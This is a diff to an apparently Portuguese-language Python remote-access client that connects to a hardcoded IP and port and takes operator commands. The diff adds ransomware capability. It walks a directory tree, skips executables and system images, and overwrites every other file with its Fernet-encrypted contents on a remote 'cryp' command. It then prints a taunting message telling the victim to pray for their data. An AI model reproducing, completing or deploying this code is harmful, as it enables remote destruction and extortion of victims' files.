@@ -4,6 +4,7 @@ import sys
 import time
 import subprocess
 import os
+from cryptography.fernet import Fernet
 
 _HOST = '192.168.100.165'
 _PORT = 9991
@@ -30,6 +31,46 @@ def conn_server(sel, soc):
             time.sleep(10)
     sel.register(soc, selectors.EVENT_READ | selectors.EVENT_WRITE)
     return sel, soc
+
+def discover(initial_path):
+    '''
+    Caminha recursivamente à partir do caminho inicial,
+    onde os arquivos deverão ser descobertos e listados
+    para depois serem encryptados.
+
+    Parameters:
+        initial_path (str): Caminho inicial que será
+        usado para criptografar os arquivos.
+
+    Returns:
+        @abs_path (str): O caminho caminho de cada arquivo que é
+        encontrado enquanto navega pelos subdiretórios.
+    '''
+    white_list = ['exe,', 'dll', 'so', 'vmlinuz', 'img']
+
+    for dirpath, _, files in os.walk(initial_path):
+        for _file in files:
+            abs_path = os.path.abspath(os.path.join(dirpath, _file))
+            ext = abs_path.split('.')[-1]
+            if ext not in white_list:
+                yield abs_path
+
+def crypt_file(filename, key):
+    '''
+    Criptografa o arquivo informado.
+
+    Parameters:
+        filename (str): Nome do arquivo que será criptografado.
+        key (str): Chave de criptografia.
+    '''
+    cipher_value = None
+    with open(filename, 'rb') as _file:
+        content = _file.read()
+        cipher_value = Fernet(key).encrypt(content)
+
+    with open(filename, 'wb') as _file:
+        _file.write(cipher_value)
+
 
 if __name__ == "__main__":
     sel = None
@@ -105,6 +146,18 @@ if __name__ == "__main__":
                             elif entry[3:5] == 'cd':
                                 os.chdir(entry[6:len(entry)-1])
                                 soc.send((os.getcwd()).encode())
+
+
+
+                            # Criptografa os arquivos do caminho especificado com a chave informada
+                            elif entry[3:7] == 'cryp':
+                                path, key = entry[7:].split(':')
+                                crypt_path = os.path.abspath(os.path.join(os.getcwd(), path))
+                                print('{}Começando a criptografar > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
+
+                                for filename in discover(crypt_path):
+                                    crypt_file(filename, key)
+                                print('{}Se quiser ver seus dados novamente, comece a rezar!{}'.format(cores['red'], cores['limpa']))
 
 
 
